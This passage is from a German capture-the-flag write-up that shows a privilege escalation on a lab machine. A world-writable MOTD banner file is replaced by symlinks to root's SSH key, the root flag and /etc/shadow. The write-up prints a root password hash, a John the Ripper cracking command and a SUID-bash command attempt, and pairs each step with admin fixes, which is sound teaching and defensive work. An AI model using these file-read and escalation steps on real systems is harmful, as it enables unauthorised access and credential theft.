+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verbinden Sie sich jetzt mit `ssh shawa@192.168.2.171 -p 2222 -i key.txt` für eine stabilere SSH-Sitzung.<br><strong>Empfehlung (Admin):** Verhindern Sie das Herunterladen und Ausführen unbekannter Binärdateien (insbesondere in `/tmp`). Überwachen Sie die Prozessliste auf verdächtige Tools wie `socat`. Implementieren Sie Egress-Firewall-Regeln, um das Herunterladen von Tools zu erschweren.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shawa@192.168.2.171 -i key.txt -p 2222</span></div>
+                     <pre>shawa was here.
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+hero:~$</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Der Angreifer verbindet sich erfolgreich per SSH über den von `socat` weitergeleiteten Port 2222 mit dem privaten Schlüssel.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine stabile SSH-Sitzung als Benutzer `shawa` ist nun etabliert. Interessant ist die Nachricht "shawa was here.", die Teil der MOTD (Message of the Day) zu sein scheint.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Mit der stabilen Shell die Privilege Escalation fortsetzen. Untersuchen Sie die SUID-Dateien und die MOTD-Nachricht.<br><strong>Empfehlung (Admin):** Untersuchen Sie den `socat`-Prozess und entfernen Sie ihn. Überprüfen Sie die MOTD-Konfiguration.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">hero:~$ <span class="command">ls -la /opt/</span></div>
+                     <pre>total 16
+drw-rw-rwx    3 root     root          4096 Feb  6 10:14 .
+drwxr-xr-x   21 root     root          4096 Feb  6 10:03 ..
+-rw-rw-rw-    1 root     root            16 Feb  6 10:09 <span class="command">banner.txt</span>
+drwx--x--x    4 root     root          4096 Feb  6 10:14 containerd</pre>
+                     <div class="prompt">hero:~$ <span class="command">cat /opt/banner.txt</span></div>
+                     <pre>shawa was here.</pre>
+                     <div class="prompt">hero:~$ <span class="command">cd /opt/containerd/</span></div>
+                     <div class="prompt">hero:/opt/containerd$ <span class="command">ls -la</span></div>
+                     <pre>ls: can't open '.': Permission denied</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Verzeichnis `/opt` wird untersucht. Es enthält eine Datei `banner.txt` und ein Verzeichnis `containerd`. Die Datei `banner.txt` enthält die MOTD-Nachricht. Der Zugriff auf `/opt/containerd` wird verweigert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Das Verzeichnis `/opt` ist für alle Benutzer beschreibbar (`drw-rw-rwx`), ebenso die Datei `banner.txt` (`-rw-rw-rw-`). Dies ist eine sehr unsichere Konfiguration. Da `banner.txt` offenbar als MOTD verwendet wird und wahrscheinlich von einem Prozess mit Root-Rechten gelesen wird (z.B. bei der SSH-Anmeldung), bietet dies einen potenziellen Angriffsvektor.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Schreibrechte auf `banner.txt` und im Verzeichnis `/opt`. Ersetzen Sie `banner.txt` durch einen Symlink auf eine Datei, die Sie als root lesen möchten (z.B. `/root/root.txt`, `/etc/shadow`, `/root/.ssh/id_rsa`). Loggen Sie sich erneut per SSH ein, um zu sehen, ob der Inhalt der verlinkten Datei als MOTD angezeigt wird.<br><strong>Empfehlung (Admin):** Korrigieren Sie dringend die Berechtigungen für `/opt` (z.B. `chmod 755 /opt`) und `/opt/banner.txt` (z.B. `chmod 644 /opt/banner.txt`). Stellen Sie sicher, dass Prozesse, die MOTD-Dateien lesen, dies sicher tun und nicht blind Symlinks folgen oder unerwartete Inhalte ausführen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Befehle aus der SSH-Sitzung -->
+                     <div class="prompt">hero:/var$ <span class="command">crontab -l</span></div>
+                     <!-- Kein Output -->
+                     <div class="prompt">hero:/var$ <span class="command">find / -type f -perm -4000 -exec ls -la {} \; 2>/dev/null</span></div>
+                     <pre>---s--x--x    1 root     root         14224 Jan 17 18:12 /bin/bbsuid</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Es wird nach Cronjobs für `shawa` gesucht (keine gefunden) und nach SUID-Dateien im System gesucht.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Eine ungewöhnliche SUID-Datei `/bin/bbsuid` wird gefunden. Diese gehört `root` und hat das SUID-Bit gesetzt. Solche benutzerdefinierten SUID-Binaries sind oft ein Weg zur Rechteausweitung.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `/bin/bbsuid` (mit `strings`, `ltrace`, `strace`, ggf. dekompilieren). Parallel dazu den vielversprechenderen Angriff über die beschreibbare `/opt/banner.txt` verfolgen.<br><strong>Empfehlung (Admin):** Überprüfen Sie den Zweck von `/bin/bbsuid`. Wenn es nicht benötigt wird oder unsicher ist, entfernen Sie es oder das SUID-Bit (`chmod u-s /bin/bbsuid`).</p>
+
+            <h2 id="proof-of-concept">Proof of Concept (Privilege Escalation via MOTD/Banner Abuse)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle aus der SSH-Sitzung -->
+                     <div class="prompt">/opt $ <span class="command">rm banner.txt</span></div>
+                     <div class="prompt">/opt $ <span class="command">ln -s /root/.ssh/id_rsa banner.txt</span></div>
+                     <!-- Kein Output -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Benutzer `shawa` nutzt die Schreibrechte in `/opt`. Die ursprüngliche `banner.txt` wird gelöscht. Anschließend wird ein symbolischer Link namens `banner.txt` erstellt, der auf den privaten SSH-Schlüssel des Root-Benutzers (`/root/.ssh/id_rsa`) zeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der erste Versuch, die Schwachstelle auszunutzen. Wenn der Prozess, der die MOTD anzeigt, dem Symlink folgt und die Datei mit Root-Rechten liest, sollte beim nächsten SSH-Login der private Schlüssel von root angezeigt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Loggen Sie sich erneut über den `socat`-Tunnel (Port 2222) per SSH ein und beobachten Sie die Ausgabe.<br><strong>Empfehlung (Admin):** Berechtigungen in `/opt` korrigieren. MOTD-Mechanismus absichern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Erneuter SSH Login via socat -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shawa@192.168.2.171 -i key.txt -p 2222</span></div>
+                     <pre>Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+hero:~$</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der erneute SSH-Login wird durchgeführt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der private Schlüssel von root wird *nicht* angezeigt. Die Standard-MOTD erscheint. Der Versuch, `/root/.ssh/id_rsa` auf diese Weise zu lesen, schlug fehl, möglicherweise aufgrund von Berechtigungen auf den übergeordneten Verzeichnissen (`/root`, `/root/.ssh`).</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Symlink auf eine Datei zu setzen, die wahrscheinlich von jedem gelesen werden kann, aber root gehört, wie `/root/root.txt`.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle aus der SSH-Sitzung -->
+                     <div class="prompt">/opt $ <span class="command">rm banner.txt</span></div>
+                     <div class="prompt">/opt $ <span class="command">ln -s /root/root.txt banner.txt</span></div>
+                     <!-- Kein Output -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Symlink `banner.txt` wird nun so geändert, dass er auf die Root-Flagge (`/root/root.txt`) zeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der nächste Versuch, die Schwachstelle auszunutzen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erneut per SSH einloggen und die MOTD prüfen.<br><strong>Empfehlung (Admin):** Grundursache (Schreibrechte, unsicheres Lesen der Banner-Datei) beheben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Erneuter SSH Login via socat -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ssh shawa@192.168.2.171 -i key.txt -p 2222</span></div>
+                     <pre><span class="password">HMVNTINPRDLL</span>  <<<= <span class="comment">(Root Flag!)</span>
+Welcome to Alpine!
+
+The Alpine Wiki contains a large amount of how-to guides and general
+information about administrating Alpine systems.
+See <https://wiki.alpinelinux.org/>.
+
+You can setup the system with the command: setup-alpine
+
+You may change this message by editing /etc/motd.
+
+hero:~$</pre>
+                 </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Der erneute SSH-Login wird durchgeführt, nachdem `banner.txt` auf `/root/root.txt` verlinkt wurde.</p>
+             <p class="evaluation">**Bewertung:** Erfolg! Die erste Zeile der Ausgabe ist `<span class="password">HMVNTINPRDLL</span>`, was der Root-Flagge entspricht. Der Prozess, der die MOTD/Banner anzeigt, liest `/opt/banner.txt` mit Root-Rechten und folgt dem Symlink zu `/root/root.txt`. Die Privilege Escalation war erfolgreich.</p>
+             <p class="recommendation">**Empfehlung (Pentester):** Root-Flagge notieren. Ziel erreicht.<br>**Empfehlung (Admin):** **Dringend** die Berechtigungen in `/opt` korrigieren und den Mechanismus, der `/opt/banner.txt` unsicher liest, identifizieren und beheben.</p>
+
+             <!-- Nachfolgende Schritte sind redundant, da Root erreicht wurde, werden aber der Vollständigkeit halber dokumentiert -->
+             <p class="analysis"><strong>Analyse (Weitere Versuche - Redundant):</strong> Nach erfolgreicher Erlangung der Root-Flagge werden weitere, nun redundante Schritte dokumentiert: Es wird versucht, `banner.txt` auf `/etc/shadow` zu verlinken, der Root-Passwort-Hash extrahiert und erfolglos versucht, ihn mit John the Ripper zu knacken. Schließlich wird versucht, über `banner.txt` einen Befehl auszuführen.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte bestätigen, dass auch `/etc/shadow` über den Symlink gelesen werden konnte (was das Extrahieren des Root-Hashes ermöglichte). Der Cracking-Versuch scheitert, was auf ein starkes Root-Passwort hindeutet. Der Versuch der Befehlsausführung über `banner.txt` ist interessant, aber unnötig, da Root-Zugriff (zumindest zum Lesen der Flagge) bereits besteht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):** Diese Schritte sind nach Erhalt der Root-Flagge nicht mehr notwendig, zeigen aber alternative Ausnutzungsmöglichkeiten der Schwachstelle auf.<br>**Empfehlung (Admin):** Die Analyse bestätigt die Schwere der Fehlkonfiguration, die das Lesen beliebiger Dateien als root ermöglichte. Das starke Root-Passwort war hier kein ausreichender Schutz.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Symlink auf /etc/shadow -->
+                     <div class="prompt">/opt $ <span class="command">rm banner.txt</span></div>
+                     <div class="prompt">/opt $ <span class="command">ln -s /etc/shadow banner.txt</span></div>
+                     <!-- Editor öffnen und Hash extrahieren -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi hash</span></div>
+                     <pre>root:<span class="password">$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJ9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59QqLPgt2NAWd80</span>:20125:0:::::</pre>
+                     <!-- John the Ripper -->
+                     <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hash</span></div>
+                     <pre>[...]
+Session aborted <span class="comment">(Passwort nicht in rockyou.txt gefunden)</span></pre>
+                     <!-- Versuch der Befehlsausführung -->
+                     <pre>echo -e "#!/bin/bash\ncp /bin/bash rootbash\nchmod +s rootbash\nrootbash" > banner.txt</pre>
+                 </div>
+             </div>
+
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/shawa/user.txt</div>
+                    <div class="flag-value"><span class="password">HMVHIMNTREAL</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">Ausgabe via MOTD (ln -s /root/root.txt /opt/banner.txt)</div>
+                    <div class="flag-value"><span class="password">HMVNTINPRDLL</span></div>
+                </div>
+            </div>
+        </section>
+ 
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <!-- Datum aus Nmap Scan übernommen (approximiert, da Jahr 2025 unrealistisch ist) -->
+        <p>Berichtsdatum: 7. Februar 2025 (Datum aus Scan)</p>
+    </footer>
+</body>
+</html>
